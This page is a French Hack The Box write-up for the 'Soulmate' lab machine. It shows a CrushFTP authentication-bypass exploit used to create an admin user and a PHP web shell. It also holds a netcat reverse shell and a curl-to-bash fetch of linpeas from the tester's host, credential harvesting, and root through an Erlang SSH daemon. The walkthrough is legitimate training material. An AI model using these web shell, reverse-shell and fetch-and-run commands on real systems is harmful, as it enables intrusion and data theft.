@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="fr" class="dark">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Soulmate - Writeup HTB</title>
+    <meta name="description" content="Writeup Hack The Box - Soulmate">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans+Expanded:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="stylesheet" href="../writeups.css">
+    <link rel="icon" type="image/jpeg" href="../../assets/favi.png">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js" defer></script>
+</head>
+
+<body class="writeups-mode">
+    <nav class="navbar">
+        <div class="container">
+            <div class="nav-content">
+                <a href="../../" class="nav-logo-link">
+                    <img src="../../assets/c8e38298-4426-4ed7-ab6b-1c8c5c263f64 (1).png" class="nav-logo"
+                        alt="logo signature Raphaël">
+                </a>
+                <div class="nav-links">
+                    <a href="../../" class="nav-link">Accueil</a>
+                    <a href="../" class="nav-link active">Writeups</a>
+                    <a href="../../Portfolio/" class="nav-link">Galerie</a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="min-h-screen">
+        <div class="writeups-container">
+            <a href="../" class="back-link">← Retour aux writeups</a>
+            <div class="writeup-content">
+<header><h1 class="page-title" dir="auto">Soulmate</h1></header><div class="page-body"><div style="display:contents" dir="auto"><h1 id="2b2aa764-c45c-8096-9ba7-cdfe1ed3337f" class="">User</h1></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80a1-b446-d416b7209612" class="">j’arrive sur le site il n’Il y a rien qui tape a l’eil Fuzzing des répertoires et je vois juste les dir de base assets, etc</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-8074-a7d8-cc3548ef22ec" class="">je pense que c’est une file upload sur la photo de profile</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80e6-8b02-dfaa73332576" class="">rien ne marche c’est transformé en jpg dans tous les cas</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-806a-81d1-c2882a0577a7" class="">Lancement de un fuzz des sous domaines avec la grosse wordlist</p></div><div style="display:contents" dir="auto"><pre id="2b2aa764-c45c-805a-b264-ed4c2986196f" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">~/Documents $ ffuf -w Discovery/DNS/subdomains-top1million-110000.txt -u http://soulmate.htb/ -H &quot;Host: FUZZ.soulmate.htb&quot; -fs 154</code></pre></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-808e-a3c6-dec43b6ccbdc" class="">ca trouve <code>ftp</code></p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-8012-80d1-e679e3ff9748" class="">j’arrivais pas a me co mais il fallais le mettre dans le <code>/etc/hosts</code></p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80f4-a4a7-db6d7c6309b1" class="">maintenant ça fonctionne</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80a3-b644-c8dd18672b54" class="">Recherche de vulnérabilités concernant crushftp et je tombe sur une cve, je la cherche sur github et voila</p></div><div style="display:contents" dir="ltr"><figure id="2b2aa764-c45c-80bd-9331-d75691db6c6c"><div class="source">https://github.com/watchtowrlabs/watchTowr-vs-CrushFTP-Authentication-Bypass-CVE-2025-54309/blob/main/watchTowr-vs-CrushFTP-CVE-2025-54309.py</div></figure></div><div style="display:contents" dir="auto"><pre id="2b2aa764-c45c-801b-9a11-e0cd9931ddd0" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">~/Documents $ python3 watchTowr-vs-CrushFTP-CVE-2025-54309.py http://ftp.soulmate.htb
+/home/ygp4ph/Documents/watchTowr-vs-CrushFTP-CVE-2025-54309.py:59: SyntaxWarning: invalid escape sequence &#x27;\c&#x27;
+  &quot;AS2-TO&quot;: &quot;\crushadmin&quot;,
+[*] Generated new c2f value: dlrJ
+			 __         ___  ___________
+	 __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
+	 \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
+	  \     / / __ \|  | \  \___|   Y  |    |(  &lt;_&gt; \     / |  | \/
+	   \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
+				  \/          \/     \/
+	
+        watchTowr-vs-CrushFTP-CVE-2025-54309.py
+        (*) CrushFTP Authentication Bypass Race Condition PoC
+
+          - Sonny , watchTowr (sonny@watchTowr.com)
+
+        CVEs: [CVE-2025-54309]
+
+[*] CRUSHFTP RACE CONDITION POC
+[*] TARGET: http://ftp.soulmate.htb
+[*] ENDPOINT: CrushFTP WebInterface getUserList
+[*] ATTACK: 5000 requests with new c2f every 50 requests
+============================================================
+Starting race with 5000 request pairs...
+============================================================
+[*] Generated new c2f value: VFHb
+[*] NEW SESSION: c2f=VFHb
+[*] EXFILTRATED 5 USERS: ben, crushadmin, default, jenna, TempAccount
+[*] VULNERABLE! RACE CONDITION POSSIBLE!</code></pre></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80c4-be5e-f7c0aead641b" class="">j’ai 5 users</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80de-a3eb-e095d7b6d336" class="">je cherche d’autre scripts</p></div><div style="display:contents" dir="ltr"><figure id="2b2aa764-c45c-8077-ab5e-efb137644d5b"><div class="source">https://github.com/issamjr/CVE-2025-54309-EXPLOIT/blob/main/exploit.py</div></figure></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-8032-aa04-f73c9df312b6" class="">il ne marche pas non plus</p></div><div style="display:contents" dir="ltr"><figure id="2b2aa764-c45c-8039-b1b6-e23e34a2493e"><div class="source">https://github.com/0xDTC/CrushFTP-auth-bypass-CVE-2025-31161/blob/master/cve-2025-31161.go</div></figure></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-8060-9951-c8e2ab7c71af" class="">la ça fonctionne</p></div><div style="display:contents" dir="auto"><div id="2b2aa764-c45c-80a9-b4b3-c3b006849f6d" class="column-list"><div style="display:contents" dir="auto"><div id="2b2aa764-c45c-8005-97c7-cd1de99f3a0b" style="width:50%" class="column"><div style="display:contents" dir="auto"><pre id="2b2aa764-c45c-803a-a7dd-e5a0f56f9251" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">~/Documents $ ./cve-2025-31161 -lu -target_host ftp.soulmate.htb
+[+] Testing user fetch capability...
+  [+] User fetch successful - Version appears vulnerable
+[+] Fetching user list...
+  [+] Users retrieved successfully
+
+[+] Users:
+  - ben
+  - crushadmin
+  - d4lly
+  - default
+  - jenna
+  - TempAccount</code></pre></div></div></div><div style="display:contents" dir="auto"><div id="2b2aa764-c45c-80e4-af16-d589b2b7e985" style="width:50%" class="column"><div style="display:contents" dir="auto"><pre id="2b2aa764-c45c-8054-bfb7-f104e843f51c" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">~/Documents $ ./cve-2025-31161 -target_host ftp.soulmate.htb -tu crushadmin -au
+[+] Testing user fetch capability...
+  [+] User fetch successful - Version appears vulnerable
+[+] Target is vulnerable! Enter username to create: rrr
+[+] Enter password for new user: rrr6677
+[+] Preparing Payloads
+  [-] Warming up the target
+  [-] Target is up and running
+[+] Sending Account Create Request
+  [!] User created successfully
+[+] Exploit Complete you can now login with
+   [*] Username: rrr
+   [*] Password: rrr6677</code></pre></div></div></div></div></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-805a-b3ee-fb3e1a511979" class="">je me connecte avec ce compte</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-8054-9135-ec9528e5335b" class="">je suis sur l’interface d’administration</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-8089-b8b3-cbb7349f8a80" class="">j’explore la page</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-800d-96db-c327f4ca6094" class="">je n’arrive pas a uplaoder des fichier (pour mettre une php avec rce)</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-802b-a63d-ecc12cfef5eb" class="">modifier le mdp de crushadmin et me connecter en tant que lui</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-8064-846d-ee9ba4daab0f" class="">il n’Il y a aucun résultat exploitable je crois</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-8032-aa18-fefc7b9a764e" class="">sur ben</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-8089-ab64-f2a9d76f681e" class="">webprod&gt;assets&gt; et la j’ai toutes les pages php de soulemate</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-8083-8523-f0f0bc0be42e" class="">ca fait 20min que le drag and drop ne fonctionne pas parce que il fallait aller dans le dossier en question avant</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80f6-b49c-cf2ed7d3b58c" class="">je fais une backdoor php</p></div><div style="display:contents" dir="auto"><pre id="2b2aa764-c45c-803f-bda6-e3be0b053105" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+echo &quot;&lt;pre&gt;&quot;;
+system($_GET[&#x27;cmd&#x27;]);
+echo &quot;&lt;/pre&gt;&quot;;
+?&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-8076-8aca-c8aeb01589af" class="">ok ça fonctionne mais en un temps super court</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80a7-8fc8-c4bcf8024c02" class="">je fais un revshell url encode </p></div><div style="display:contents" dir="auto"><pre id="2b2aa764-c45c-8002-89ab-d43e8fa402e5" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">busybox%20nc%2010.10.15.157%209001%20-e%20%2Fbin%2Fbash</code></pre></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80d8-92ed-cf3216d3655b" class=""><a href="http://soulmate.htb/yg.php?cmd=busybox%20nc%2010.10.15.157%209001%20-e%20%2Fbin%2Fbash">http://soulmate.htb/yg.php?cmd=busybox%20nc%2010.10.15.157%209001%20-e%20%2Fbin%2Fbash</a></p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-800f-a933-c9e3357a423b" class="">j’obtiens un pseudo terminal</p></div><div style="display:contents" dir="auto"><pre id="2b2aa764-c45c-8060-aa22-f6ac5ed51a20" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</code></pre></div><div style="display:contents" dir="auto"><pre id="2b2aa764-c45c-80c7-8d7a-c7fe88f8d3e2" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">www-data@soulmate:~/soulmate.htb/public$ pwd
+/var/www/soulmate.htb/public
+www-data@soulmate:~/soulmate.htb/public$ ls
+assets	       index.php  logout.php   register.php
+dashboard.php  login.php  profile.php
+www-data@soulmate:~/soulmate.htb/public$ cd ..
+www-data@soulmate:~/soulmate.htb$ ls
+config	data  public  src
+www-data@soulmate:~/soulmate.htb$ cd data
+cd data
+www-data@soulmate:~/soulmate.htb/data$ ls
+ls
+soulmate.db</code></pre></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-8059-8285-d250aa49e734" class="">j’ai la db, Lancement de un serv python pour exfiltrer la base de donnée</p></div><div style="display:contents" dir="auto"><pre id="2b2aa764-c45c-800d-b949-f901fab879df" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">~/Documents $ sqlite3 soulmate.db
+SQLite version 3.51.0 2025-11-04 19:38:17
+Enter &quot;.help&quot; for usage hints.
+sqlite&gt; .tables
+users
+sqlite&gt; .schema users
+CREATE TABLE users (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT UNIQUE NOT NULL,
+            password TEXT NOT NULL,
+            is_admin INTEGER DEFAULT 0,
+            name TEXT,
+            bio TEXT,
+            interests TEXT,
+            phone TEXT,
+            profile_pic TEXT,
+            last_login DATETIME,
+            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+        );
+sqlite&gt; .headers on
+sqlite&gt; .mode column
+sqlite&gt; SELECT * FROM users;
+id  username  password                                                      is_admin  name           bio  interests  phone  profile_pic  last_login           created_at
+--  --------  ------------------------------------------------------------  --------  -------------  ---  ---------  -----  -----------  -------------------  -------------------
+1   admin     $2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2  1         Administrator                                      2025-08-10 13:00:08  2025-08-10 12:59:39
+sqlite&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80d0-ac82-d800c57c7f66" class="">c’est pas la bonne piste donc je dois tout recommencer depuis <a href="Soulmate%202b2aa764c45c801caa8fcfff3e2d5960.html">ici</a></p></div><div style="display:contents" dir="auto"><pre id="2b2aa764-c45c-80ea-bcc0-d666c668b757" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">www-data@soulmate:~/soulmate.htb/public$ curl 10.10.15.157:6677/.sh | bash</code></pre></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-803a-a532-e23377fc05b3" class="">le linpeas dit qu’Il y a un mdp en clair :</p></div><div style="display:contents" dir="auto"><pre id="2b2aa764-c45c-80e2-801e-d473fc1a720c" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">/var/www/soulmate.htb/config/config.php:
+$adminPassword = password_hash(&#x27;Crush4dmin990&#x27;, PASSWORD_DEFAULT);</code></pre></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-8057-9884-dad76ae33a75" class="">je verifie dans le doute si c’est le meme que dans la db sql et OUI</p></div><div style="display:contents" dir="ltr"><figure id="2b2aa764-c45c-8027-94f3-cb0b35dd6575" class="image"><a href="Soulmate/image.png"><img style="width:672px" src="image.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-809d-a757-f3029430d513" class="">ah</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80c3-89d3-fe8e15543794" class="">le mdp c’est pas celui de ben et Il n'y a pas de user qui s’appelle admin</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80ca-9e90-d3b8fd8f8d8b" class="">je reviens sur mon lineas et je regarde mieux</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80d8-9c80-c45a058a3209" class="">Il y a un processus root en cours executé par crushftp qui execute start.escript</p></div><div style="display:contents" dir="auto"><pre id="2b2aa764-c45c-80ef-960a-e3e19bcc60e1" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript</code></pre></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80d7-a476-c4e32353afc8" class="">je le cat pour voir ce que c’est</p></div><div style="display:contents" dir="auto"><pre id="2b2aa764-c45c-80d1-b3b3-c8d8df5fde62" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">www-data@soulmate:~/soulmate.htb/public$ cd /usr/local/lib/erlang_login/
+cd /usr/local/lib/erlang_login/
+www-data@soulmate:/usr/local/lib/erlang_login$ ls
+ls
+login.escript  start.escript
+www-data@soulmate:/usr/local/lib/erlang_login$ cat start.escript
+cat start.escript
+#!/usr/bin/env escript
+%%! -sname ssh_runner
+
+main(_) -&gt;
+    application:start(asn1),
+    application:start(crypto),
+    application:start(public_key),
+    application:start(ssh),
+
+    io:format(&quot;Starting SSH daemon with logging...~n&quot;),
+
+    case ssh:daemon(2222, [
+        {ip, {127,0,0,1}},
+        {system_dir, &quot;/etc/ssh&quot;},
+
+        {user_dir_fun, fun(User) -&gt;
+            Dir = filename:join(&quot;/home&quot;, User),
+            io:format(&quot;Resolving user_dir for ~p: ~s/.ssh~n&quot;, [User, Dir]),
+            filename:join(Dir, &quot;.ssh&quot;)
+        end},
+
+        {connectfun, fun(User, PeerAddr, Method) -&gt;
+            io:format(&quot;Auth success for user: ~p from ~p via ~p~n&quot;,
+                      [User, PeerAddr, Method]),
+            true
+        end},
+
+        {failfun, fun(User, PeerAddr, Reason) -&gt;
+            io:format(&quot;Auth failed for user: ~p from ~p, reason: ~p~n&quot;,
+                      [User, PeerAddr, Reason]),
+            true
+        end},
+
+        {auth_methods, &quot;publickey,password&quot;},
+
+        {user_passwords, [{&quot;ben&quot;, &quot;HouseH0ldings998&quot;}]},
+        {idle_time, infinity},
+        {max_channels, 10},
+        {max_sessions, 10},
+        {parallel_login, true}
+    ]) of
+        {ok, _Pid} -&gt;
+            io:format(&quot;SSH daemon running on port 2222. Press Ctrl+C to exit.~n&quot;);
+        {error, Reason} -&gt;
+            io:format(&quot;Failed to start SSH daemon: ~p~n&quot;, [Reason])
+    end,
+
+    receive
+        stop -&gt; ok
+    end.</code></pre></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80b2-ae12-cbddb08bf554" class=""><code>HouseH0ldings998</code> me ssh a ben avec ce password</p></div><div style="display:contents" dir="auto"><h1 id="2b2aa764-c45c-80e7-96bc-f29c2ca7b936" class="">Root</h1></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-802c-94af-d4489333c34c" class="">c’est le user le plus dur que j’ai jamais fait</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80fc-9fc2-d6b083ca37ab" class="">je re linpeas</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80ba-9040-f61cfcabff9f" class="">Il y a un script du crontab executée en root</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-8065-8c2f-e153488bc2b0" class="">c’est pas ca l’exploit</p></div><div style="display:contents" dir="auto"><pre id="2b2aa764-c45c-80fe-9a07-dd34b9581b8a" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">[+] [CVE-2022-0847] DirtyPipe
+[+] [CVE-2021-4034] PwnKit
+[+] [CVE-2021-3156] sudo Baron Samedit
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE</code></pre></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80d8-844c-c8d982e440c4" class="">aucun de tout ca ne fonctionne je relis mon linpeas et Recherche d'informations sur Erlang</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-809e-8fdf-c94015021378" class="">L&#x27;énumération a révélé que le serveur hôte le processus <strong>Erlang</strong> sur le port <strong>2222</strong>, accessible uniquement depuis <code>localhost</code>.</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-8023-a66f-c09d2cac0316" class="">le script erlang est géré par crushftp qui tourne en root et herite donc de ses privileges.</p></div><div style="display:contents" dir="auto"><p id="2b2aa764-c45c-80d4-b9ef-f04da5ca9102" class="">la BEAM (machine virtuelle erlang) agit en root donc si Connexion SSH dedans tout ce que je fais sera executé en root (dans le langage erlang donc) (merci gemini sans toi j’aurais jamais compris)</p></div><div style="display:contents" dir="auto"><pre id="2b2aa764-c45c-800b-8783-cc0037cac10c" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">ben@soulmate:~$ ssh ben@localhost -p 2222
+
+(ssh_runner@soulmate)1&gt; os:cmd(&#x27;id&#x27;).
+(ssh_runner@soulmate)1&gt; os:cmd(&#x27;id&#x27;).
+
+&quot;uid=0(root) gid=0(root) groups=0(root)\n&quot;
+(ssh_runner@soulmate)2&gt; os:cmd(&quot;cat /root/root.txt&quot;).
+(ssh_runner@soulmate)2&gt; os:cmd(&quot;cat /root/root.txt&quot;).
+
+&quot;...\n&quot;</code></pre></div><div style="display:contents" dir="auto"></div></div>
+            </div>
+        </div>
+    </main>
+</body>
+
+</html>
